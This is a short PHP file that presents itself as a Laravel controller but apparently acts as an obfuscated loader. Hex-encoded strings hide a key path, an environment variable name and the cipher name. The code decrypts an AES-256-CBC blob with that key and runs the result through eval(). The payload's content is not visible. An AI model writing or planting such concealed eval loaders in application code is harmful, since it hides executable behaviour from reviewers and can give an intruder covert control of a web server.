<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('hit7c7z3aXeq0uplqxeSdA==');

$c=base64_decode(

'Pl+RL5rtEjvDqGuw8jlpgZsLHUo1yzlJyTtHj2g4WnGxtPviMBjViEvliIGjWZzGyIxZH7pYuXcF' .
'NVltIWF40uJiMDqzIfMH5aARZK3OMzF+avxepDV8poQZjuhY7ekHRs7vjB4rMsj2DQhkChOX1WVF' .
'9nEwEMJ7t/wobZ8VXKeaQ1A4N/Y8NdfiY2hJL58am3Ei3sj/oejC4oQI3/uf5wKyDGjQP+kk9ixg' .
'BgGMrxtYL6/DyfvJu2v/rOKgAglJGI5lcgl9RVkxPg5AFdXOvYFvsxNdkBA9xld0FnklJLqe4rJX' .
'PnKMeC2ajQiDu4Mf3/u3/dCdrSvdRND/9w5CIHKR1Hs/VKm3hseCwCrI1uk9YBrBdv3B8zQE3oD/' .
'TfCplsrycOPsxA6bQGFBihXfJQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

